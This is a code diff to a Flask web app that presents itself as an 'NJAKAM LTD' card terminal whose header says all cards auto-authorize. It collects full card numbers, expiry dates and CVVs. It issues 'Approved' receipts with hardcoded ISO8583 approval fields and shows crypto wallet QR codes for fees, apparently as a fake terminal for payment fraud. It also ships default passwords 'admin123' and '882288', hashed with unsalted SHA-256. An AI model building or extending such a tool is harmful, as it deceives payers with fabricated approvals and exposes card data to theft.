@@ -1,13 +1,15 @@
 # app.py - cleaned NJAKAM LTD POS (all cards auto-authorize)
 from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
 from flask_mail import Mail, Message
-import random, logging, os, hashlib, json, re, tempfile
+import random, logging, os, hashlib, json, re, tempfile, threading
 from functools import wraps
 from decimal import Decimal, InvalidOperation
 from dotenv import load_dotenv
 from datetime import datetime
+from html import escape as html_escape
 import io
 from reportlab.lib.pagesizes import letter
+from reportlab.lib.colors import HexColor, black
 from reportlab.pdfgen import canvas
 
 # Load environment variables from .env file
@@ -35,6 +37,56 @@ app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
 app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'support@njakamltd.com')
 mail = Mail(app)
 
+# Footer on receipt emails (plain text + HTML)
+TERMINAL_MAIL_ADDRESS_LINE = "74428 - 00200 Nairobi"
+TERMINAL_MAIL_CONTACT = "+14145126049"
+TERMINAL_MAIL_SUPPORT_EMAIL = "support@njakamltd.com"
+
+
+def _receipt_email_plain_and_html(txn_id, amount_fmt, timestamp):
+    """Plain and HTML bodies for receipt emails; address block includes contact phone."""
+    plain = f"""Dear Customer,
+
+Thank you for your transaction at Njakam LTD.
+
+Please find your receipt attached as a PDF.
+
+Transaction Summary:
+- Transaction ID: {txn_id}
+- Amount: USD {amount_fmt}
+- Date: {timestamp}
+- Status: Approved
+
+---
+Njakam LTD Terminal
+{TERMINAL_MAIL_ADDRESS_LINE}
+Terminal support: {TERMINAL_MAIL_CONTACT}
+
+This is an automated receipt. Please keep for your records.
+"""
+    tel_href = "".join(c for c in TERMINAL_MAIL_CONTACT if c.isdigit() or c == "+")
+    if not tel_href.startswith("+"):
+        tel_href = "+" + tel_href.lstrip("+")
+    html = f"""<!DOCTYPE html>
+<html><head><meta charset="utf-8"></head><body style="margin:16px;font-family:system-ui,-apple-system,sans-serif;font-size:15px;color:#0f172a;line-height:1.5;">
+<p>Dear Customer,</p>
+<p>Thank you for your transaction at Njakam LTD.</p>
+<p>Please find your receipt attached as a PDF.</p>
+<p><strong>Transaction Summary:</strong></p>
+<ul style="margin:0.5em 0;padding-left:1.25em;">
+<li>Transaction ID: {html_escape(str(txn_id))}</li>
+<li>Amount: USD {html_escape(str(amount_fmt))}</li>
+<li>Date: {html_escape(str(timestamp))}</li>
+<li>Status: Approved</li>
+</ul>
+<hr style="border:none;border-top:1px solid #cbd5e1;margin:1.25rem 0;">
+<p style="margin:0;"><strong>Njakam LTD Terminal</strong><br>
+{html_escape(TERMINAL_MAIL_ADDRESS_LINE)}<br>
+Terminal support: <a href="tel:{html_escape(tel_href)}">{html_escape(TERMINAL_MAIL_CONTACT)}</a></p>
+<p style="margin-top:1rem;font-size:13px;color:#64748b;">This is an automated receipt. Please keep for your records.</p>
+</body></html>"""
+    return plain, html
+
 # Fixed numeric Server ID for receipts (env SERVER_ID = digits only, e.g. "123456"; default "000000")
 DEFAULT_SERVER_ID = "000000"
 
@@ -49,6 +101,21 @@ def _mask_receipt_server_id(server_id):
     sid = (server_id or DEFAULT_SERVER_ID).strip()
     length = max(6, min(len(sid), 12))  # mask length 6–12
     return "*" * length
+
+
+def _mask_email_for_receipt(email):
+    """Mask local part on printed/screen receipts; domain stays visible."""
+    e = (email or "").strip()
+    if not e or "@" not in e:
+        return "—"
+    local, _, domain = e.partition("@")
+    domain = domain.strip()
+    if not domain:
+        return "—"
+    if not local:
+        return f"••••@{domain}"
+    return f"{local[0]}••••@{domain}"
+
 
 def _wallet_image_filename(payout_type):
     """Return the wallet image filename that exists on disk (tries both cases for Linux)."""
@@ -71,21 +138,77 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
         c = canvas.Canvas(pdf_buffer, pagesize=letter)
         width, height = letter
         
-        # Logo at top
-        logo_path = os.path.join(app.root_path, 'static', 'logo.jpg')
-        if os.path.exists(logo_path):
-            c.drawImage(logo_path, 40, height - 80, width=120, height=60)
-        
-        y = height - 100
-        
-        # Header
-        c.setFont("Helvetica-Bold", 14)
-        c.drawString(180, y, "NJAKAM LTD")
-        y -= 20
-        c.setFont("Helvetica", 10)
-        c.drawString(180, y, "CUSTOMER COPY")
-        y -= 30
-        
+        margin_x = 40
+        inner_w = width - 2 * margin_x
+        logo_path = os.path.join(app.root_path, 'static', 'logo.png')
+        has_logo = os.path.exists(logo_path)
+        img_w, img_h = (108, 54) if has_logo else (0, 0)
+        logo_gap = 16 if has_logo else 0
+
+        title = "NJAKAM LTD"
+        title_font, title_size = "Helvetica-Bold", 28
+        addr_lines = [
+            TERMINAL_MAIL_ADDRESS_LINE,
+            f"Terminal support: {TERMINAL_MAIL_CONTACT}",
+            TERMINAL_MAIL_SUPPORT_EMAIL,
+        ]
+        addr_font, addr_size = "Helvetica", 10
+        line_gap = 12
+        pad = 10
+        gap_title_addr = 8
+        content_h = (
+            pad
+            + title_size
+            + gap_title_addr
+            + (len(addr_lines) - 1) * line_gap
+            + addr_size
+            + pad
+        )
+        block_h = max(content_h, img_h + 8) if has_logo else content_h
+        block_top = height - 36
+        block_bottom = block_top - block_h
+        block_x = margin_x + img_w + logo_gap
+        block_w = width - margin_x - block_x
+
+        # Right block: large title + address (single framed column)
+        c.setFillColor(HexColor("#f8fafc"))
+        c.setStrokeColor(HexColor("#cbd5e1"))
+        c.setLineWidth(0.75)
+        c.roundRect(block_x, block_bottom, block_w, block_h, 6, stroke=1, fill=1)
+
+        text_left = block_x + pad
+        y_cursor = block_top - pad - 2
+        c.setFillColor(black)
+        c.setFont(title_font, title_size)
+        c.drawString(text_left, y_cursor, title)
+        y_cursor -= title_size + gap_title_addr
+        c.setFont(addr_font, addr_size)
+        c.setFillColor(HexColor("#475569"))
+        for line in addr_lines:
+            c.drawString(text_left, y_cursor, line)
+            y_cursor -= line_gap
+        c.setFillColor(black)
+
+        # Left block: logo only, vertically centered with the title column
+        if has_logo:
+            logo_y = block_bottom + (block_h - img_h) / 2
+            c.drawImage(logo_path, margin_x, logo_y, width=img_w, height=img_h)
+
+        y = block_bottom - 16
+
+        # Accent bar + copy label (full width below header row)
+        bar_h = 3
+        c.setFillColor(HexColor("#0f766e"))
+        c.rect(margin_x, y - bar_h, inner_w, bar_h, fill=1, stroke=0)
+        y -= bar_h + 12
+        c.setFont("Helvetica-Bold", 11)
+        c.setFillColor(HexColor("#64748b"))
+        sub = "CUSTOMER COPY"
+        sw = c.stringWidth(sub, "Helvetica-Bold", 11)
+        c.drawString((width - sw) / 2, y, sub)
+        c.setFillColor(black)
+        y -= 26
+
         # Merchant fee wallet image: TRC20.jpeg or ERC20.jpeg (the QR/address to pay 0.5% fee)
         qr_x = width - 130
         qr_y_start = y  # Same level as transaction ID
@@ -168,11 +291,23 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
 
 USERNAME = "njakamaltd"
 PASSWORD_FILE = "password.json"
+TRANSACTIONS_FILE = "transactions.json"
+MAX_STORED_TRANSACTIONS = 2000
+_transactions_lock = threading.Lock()
 
 if not os.path.exists(PASSWORD_FILE):
     with open(PASSWORD_FILE, "w") as f:
         hashed = hashlib.sha256("admin123".encode()).hexdigest()
         json.dump({"password": hashed}, f)
+
+TERMINAL_GATE_FILE = "terminal_gate.json"
+
+if not os.path.exists(TERMINAL_GATE_FILE):
+    with open(TERMINAL_GATE_FILE, "w") as f:
+        default_gate = os.environ.get("TERMINAL_GATE_CODE", "882288")
+        gh = hashlib.sha256(default_gate.encode()).hexdigest()
+        json.dump({"gate_password": gh}, f)
+
 
 def check_password(raw):
     with open(PASSWORD_FILE) as f:
@@ -184,6 +319,46 @@ def set_password(newpass):
         hashed = hashlib.sha256(newpass.encode()).hexdigest()
         json.dump({"password": hashed}, f)
 
+
+def check_terminal_gate(raw):
+    """Separate from staff login; unlocks Settings & Reports only."""
+    try:
+        with open(TERMINAL_GATE_FILE, encoding="utf-8") as f:
+            stored = json.load(f)["gate_password"]
+        return hashlib.sha256((raw or "").encode()).hexdigest() == stored
+    except (OSError, KeyError, TypeError, json.JSONDecodeError):
+        return False
+
+
+def _sanitize_terminal_gate_next(candidate):
+    """Allow only in-app paths for Settings and Reports (no open redirects)."""
+    if not candidate or not isinstance(candidate, str):
+        return url_for("dashboard")
+    path = candidate.split("?")[0].strip()
+    if not path.startswith("/"):
+        return url_for("dashboard")
+    path = path.rstrip("/") or "/"
+    allowed = frozenset(
+        (
+            url_for("settings").rstrip("/"),
+            url_for("reports").rstrip("/"),
+        )
+    )
+    if path in allowed:
+        return path
+    return url_for("dashboard")
+
+
+def _terminal_unlock_session_key_for_path(path):
+    """Which session flag to set after a successful unlock for this path."""
+    p = (path or "").rstrip("/")
+    if p == url_for("settings").rstrip("/"):
+        return "terminal_unlock_settings"
+    if p == url_for("reports").rstrip("/"):
+        return "terminal_unlock_reports"
+    return None
+
+
 def login_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -192,24 +367,123 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-# Protocols (determine expected auth code length)
-PROTOCOLS = {
+
+def require_terminal_unlock(area):
+    """Staff login + terminal code for this area only (Settings and Reports each ask once per session)."""
+    session_key = f"terminal_unlock_{area}"
+    if area not in ("settings", "reports"):
+        raise ValueError("area must be 'settings' or 'reports'")
+
+    def decorator(f):
+        @wraps(f)
+        def decorated_view(*args, **kwargs):
+            if not session.get("logged_in"):
+                return redirect(url_for("login"))
+            if not session.get(session_key):
+                dest = url_for(area)
+                return redirect(url_for("terminal_gate", next=dest))
+            return f(*args, **kwargs)
+        return decorated_view
+    return decorator
+
+
+# Protocols (determine expected auth code length) — split for UI: online vs offline
+ONLINE_PROTOCOLS = {
     "POS Terminal -101.1 (4-digit approval)": 4,
-    "POS Terminal -101.4 (6-digit approval)": 6,
+    "POS Terminal -101.4 (4-digit approval)": 4,
     "POS Terminal -101.6 (Pre-authorization)": 6,
     "POS Terminal -101.7 (4-digit approval)": 4,
     "POS Terminal -101.8 (PIN-LESS transaction)": 4,
     "POS Terminal -201.1 (6-digit approval)": 6,
-    "POS Terminal -201.3 (6-digit approval, offline )": 6,
-    "POS Terminal -201.5 (6-digit approval)": 6
+    "POS Terminal -201.5 (6-digit approval)": 6,
 }
+OFFLINE_PROTOCOLS = {
+    "POS Terminal -101.1 (4-digit approval, offline)": 4,
+    "POS Terminal -201.3 (6-digit approval, offline )": 6,
+}
+PROTOCOLS = {**ONLINE_PROTOCOLS, **OFFLINE_PROTOCOLS}
+
+def _clear_sale_session():
+    """Reset in-progress sale data (keep login)."""
+    for key in (
+        'protocol_mode', 'protocol', 'code_length', 'pinless', 'offline',
+        'amount', 'payout_type', 'wallet', 'pan', 'exp', 'cvv', 'card_type', 'email',
+        'txn_id', 'arn', 'timestamp', 'field39', 'auth_code',
+        '_txn_history_logged',
+    ):
+        session.pop(key, None)
+
+
+def _load_transactions():
+    """Return stored transactions, newest first."""
+    with _transactions_lock:
+        if not os.path.exists(TRANSACTIONS_FILE):
+            return []
+        try:
+            with open(TRANSACTIONS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            return data if isinstance(data, list) else []
+        except (json.JSONDecodeError, OSError) as e:
+            logging.warning("Could not read %s: %s", TRANSACTIONS_FILE, e)
+            return []
+
+
+def _append_transaction_record(record):
+    """Persist one approved sale. Omits full PAN, CVV, and plaintext auth code."""
+    with _transactions_lock:
+        rows = []
+        if os.path.exists(TRANSACTIONS_FILE):
+            try:
+                with open(TRANSACTIONS_FILE, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                if isinstance(data, list):
+                    rows = data
+            except (json.JSONDecodeError, OSError) as e:
+                logging.warning("Corrupt %s, starting fresh: %s", TRANSACTIONS_FILE, e)
+                rows = []
+        # Avoid duplicate row if same txn_id is logged again
+        tid = record.get("txn_id")
+        if tid:
+            rows = [r for r in rows if r.get("txn_id") != tid]
+        rows.insert(0, record)
+        rows = rows[:MAX_STORED_TRANSACTIONS]
+        tmp_path = TRANSACTIONS_FILE + ".tmp"
+        with open(tmp_path, "w", encoding="utf-8") as f:
+            json.dump(rows, f, indent=2)
+        os.replace(tmp_path, TRANSACTIONS_FILE)
+
+
+def _require_protocol_selected():
+    """Require a protocol that matches the chosen online/offline mode (host connection)."""
+    proto = session.get('protocol')
+    if not proto:
+        return redirect(url_for('protocol'))
+    mode = session.get('protocol_mode')
+    if not mode or mode not in ('online', 'offline'):
+        flash("Connection mode missing. Please choose host connection again.")
+        session.pop('protocol', None)
+        return redirect(url_for('protocol'))
+    allowed = ONLINE_PROTOCOLS if mode == 'online' else OFFLINE_PROTOCOLS
+    if proto not in allowed:
+        flash("Selected protocol does not match online/offline mode. Please pick protocols again.")
+        session.pop('protocol', None)
+        return redirect(url_for('protocol_select'))
+    if proto not in PROTOCOLS:
+        flash("Invalid protocol.")
+        session.pop('protocol', None)
+        return redirect(url_for('protocol_select'))
+    return None
 
 @app.route('/')
 def home():
+    if session.get('logged_in'):
+        return redirect(url_for('dashboard'))
     return redirect(url_for('login'))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
+    if session.get('logged_in'):
+        return redirect(url_for('dashboard'))
     if request.method == 'POST':
         user = request.form.get('username')
         passwd = request.form.get('password')
@@ -217,9 +491,47 @@ def login():
             session.clear()
             session['logged_in'] = True
             session['username'] = user
-            return redirect(url_for('protocol'))
+            return redirect(url_for('dashboard'))
         flash("Invalid username or password.")
     return render_template('login.html')
+
+@app.route('/dashboard')
+@login_required
+def dashboard():
+    return render_template('dashboard.html')
+
+@app.route('/history')
+@login_required
+def history():
+    transactions = _load_transactions()
+    return render_template('history.html', transactions=transactions)
+
+@app.route('/terminal-gate', methods=['GET', 'POST'])
+@login_required
+def terminal_gate():
+    """Unlock Settings & Reports with a code different from staff login password."""
+    next_path = _sanitize_terminal_gate_next(
+        request.args.get("next") or request.form.get("next")
+    )
+    if request.method == "POST":
+        if check_terminal_gate(request.form.get("gate_code", "")):
+            sk = _terminal_unlock_session_key_for_path(next_path)
+            if sk:
+                session[sk] = True
+            return redirect(next_path)
+        flash("Invalid terminal access code.")
+    return render_template("terminal_gate.html", next_path=next_path)
+
+
+@app.route('/settings')
+@require_terminal_unlock("settings")
+def settings():
+    return render_template('settings.html')
+
+@app.route('/reports')
+@require_terminal_unlock("reports")
+def reports():
+    return render_template('reports.html')
 
 @app.route('/logout')
 def logout():
@@ -230,26 +542,52 @@ def logout():
 @app.route('/protocol', methods=['GET', 'POST'])
 @login_required
 def protocol():
+    """Step 1: choose online vs offline host link; then /protocol/select for variant."""
+    if request.method == 'POST':
+        mode = request.form.get('protocol_mode')
+        if mode not in ('online', 'offline'):
+            flash("Please choose online or offline.")
+            return redirect(url_for('protocol'))
+        session['protocol_mode'] = mode
+        return redirect(url_for('protocol_select'))
+    _clear_sale_session()
+    return render_template('protocol_mode.html')
+
+@app.route('/protocol/select', methods=['GET', 'POST'])
+@login_required
+def protocol_select():
+    """Step 2: pick exact protocol for the chosen mode."""
+    mode = session.get('protocol_mode')
+    if not mode:
+        return redirect(url_for('protocol'))
+    protocols_dict = ONLINE_PROTOCOLS if mode == 'online' else OFFLINE_PROTOCOLS
+
     if request.method == 'POST':
         selected = request.form.get('protocol')
-        if selected not in PROTOCOLS:
+        if selected not in protocols_dict:
             flash("Invalid protocol selected.")
-            return redirect(url_for('protocol'))
+            return redirect(url_for('protocol_select'))
+        if selected not in PROTOCOLS:
+            flash("Unknown protocol.")
+            return redirect(url_for('protocol_select'))
         session['protocol'] = selected
         session['code_length'] = PROTOCOLS[selected]
-
-        # Flag pinless
         session['pinless'] = ("101.8" in selected)
-
-        # Flag offline, no-CVV protocol (currently 201.3 variant)
-        session['offline'] = ("201.3" in selected)
-
+        session['offline'] = selected in OFFLINE_PROTOCOLS
         return redirect(url_for('amount'))
-    return render_template('protocol.html', protocols=PROTOCOLS.keys())
+
+    return render_template(
+        'protocol_select.html',
+        protocol_mode=mode,
+        protocols_dict=protocols_dict,
+    )
 
 @app.route('/amount', methods=['GET', 'POST'])
 @login_required
 def amount():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
     if request.method == 'POST':
         session['amount'] = request.form.get('amount')
         return redirect(url_for('payout'))
@@ -258,6 +596,9 @@ def amount():
 @app.route('/payout', methods=['GET', 'POST'])
 @login_required
 def payout():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
     if request.method == 'POST':
         method = request.form['method']
         session['payout_type'] = method
@@ -309,6 +650,9 @@ def luhn_check(card_number: str) -> bool:
 @app.route('/card', methods=['GET', 'POST'])
 @login_required
 def card():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
     offline = session.get('offline', False)
     if request.method == 'POST':
         # sanitize inputs (client formatting may include spaces/slashes)
@@ -426,6 +770,9 @@ def card():
 @app.route('/decrypting')
 @login_required
 def decrypting():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
     # Pinless (101.8): set transaction details here so flow can proceed to processing -> success like other protocols
     if not session.get('txn_id'):
         code_length = session.get('code_length', 4)
@@ -441,6 +788,9 @@ def decrypting():
 @app.route('/auth', methods=['GET', 'POST'])
 @login_required
 def auth():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
     expected_length = session.get('code_length', 6)
 
     if request.method == 'POST':
@@ -472,12 +822,55 @@ def auth():
 @app.route('/processing')
 @login_required
 def processing():
-    # Show connecting screen, JS will handle the 30-second wait and redirect to failure
-    return render_template('processing.html')
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
+    offline = session.get('offline', False)
+    return render_template('processing.html', offline=offline)
 
 @app.route('/success')
 @login_required
 def success():
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
+
+    raw_amount = session.get("amount", "0")
+    try:
+        amt = Decimal(str(raw_amount))
+        amount_fmt = f"{amt:,.2f}"
+    except (InvalidOperation, TypeError):
+        amount_fmt = "0.00"
+
+    txn_id = session.get("txn_id")
+    if txn_id and not session.get("_txn_history_logged"):
+        raw_protocol = session.get("protocol", "")
+        pv_match = re.search(r"-(\d+\.\d+)", raw_protocol)
+        protocol_code = pv_match.group(1) if pv_match else "—"
+        ac = session.get("auth_code") or ""
+        auth_display = ("*" * len(ac)) if ac else "—"
+        record = {
+            "txn_id": txn_id,
+            "timestamp": session.get("timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "amount": str(session.get("amount")),
+            "amount_fmt": amount_fmt,
+            "payout_type": (session.get("payout_type") or "").strip(),
+            "pan_last4": session.get("pan", "")[-4:] if session.get("pan") else "",
+            "protocol": raw_protocol,
+            "protocol_code": protocol_code,
+            "offline": bool(session.get("offline")),
+            "arn": session.get("arn") or "",
+            "card_type": session.get("card_type") or "",
+            "email_masked": _mask_email_for_receipt(session.get("email")),
+            "operator": session.get("username") or "",
+            "auth_masked": auth_display,
+        }
+        try:
+            _append_transaction_record(record)
+            session["_txn_history_logged"] = True
+        except OSError:
+            logging.exception("Failed to persist transaction history")
+
     # Automatically send receipt email
     recipient_email = session.get('email')
     if recipient_email and app.config['MAIL_USERNAME'] and app.config['MAIL_PASSWORD']:
@@ -492,13 +885,6 @@ def success():
             else:
                 protocol_version = "Unknown"
                 auth_digits = 4
-            
-            raw_amount = session.get("amount", "0")
-            try:
-                amt = Decimal(str(raw_amount))
-                amount_fmt = f"{amt:,.2f}"
-            except (InvalidOperation, TypeError):
-                amount_fmt = "0.00"
             
             # Get actual auth code (not masked)
             auth_code = session.get("auth_code", "")
@@ -529,30 +915,14 @@ def success():
             
             # Create email message
             subject = f"Njakam LTD Receipt - Transaction {session.get('txn_id')}"
-            
-            body = f"""Dear Customer,
-
-Thank you for your transaction at Njakam LTD.
-
-Please find your receipt attached as a PDF.
-
-Transaction Summary:
-- Transaction ID: {session.get('txn_id')}
-- Amount: USD {amount_fmt}
-- Date: {session.get('timestamp')}
-- Status: Approved
-
----
-Njakam LTD Terminal
-74428 - 00200 Nairobi
-
-This is an automated receipt. Please keep for your records.
-            """
-            
+            body, html_body = _receipt_email_plain_and_html(
+                session.get('txn_id'), amount_fmt, session.get('timestamp')
+            )
             msg = Message(
                 subject=subject,
                 recipients=[recipient_email],
                 body=body,
+                html=html_body,
                 sender=app.config['MAIL_DEFAULT_SENDER']
             )
             
@@ -624,7 +994,7 @@ def receipt():
         wallet=session.get("wallet"),
         wallet_image=wallet_image,
         auth_code=auth_mask,
-        email=session.get("email"),
+        email=_mask_email_for_receipt(session.get("email")),
         iso_field_18="5999",                # Default MCC
         iso_field_25="00",                  # POS condition
         field39="00",                       # ISO8583 Field 39 (approved)
@@ -650,7 +1020,7 @@ def receipt_print():
         payout=session.get("payout_type"),
         wallet=session.get("wallet"),
         auth_code=session.get("auth_code", "****"),
-        email=session.get("email"),
+        email=_mask_email_for_receipt(session.get("email")),
         iso_field_18="5999",
         iso_field_25="00",
         field39="00",
@@ -721,30 +1091,14 @@ def send_receipt_email():
         
         # Create email message
         subject = f"Njakam LTD Receipt - Transaction {session.get('txn_id')}"
-        
-        body = f"""Dear Customer,
-
-Thank you for your transaction at Njakam LTD.
-
-Please find your receipt attached as a PDF.
-
-Transaction Summary:
-- Transaction ID: {session.get('txn_id')}
-- Amount: USD {amount_fmt}
-- Date: {session.get('timestamp')}
-- Status: Approved
-
----
-Njakam LTD Terminal
-74428 - 00200 Nairobi
-
-This is an automated receipt. Please keep for your records.
-        """
-        
+        body, html_body = _receipt_email_plain_and_html(
+            session.get('txn_id'), amount_fmt, session.get('timestamp')
+        )
         msg = Message(
             subject=subject,
             recipients=[recipient_email],
             body=body,
+            html=html_body,
             sender=app.config['MAIL_DEFAULT_SENDER']
         )
         
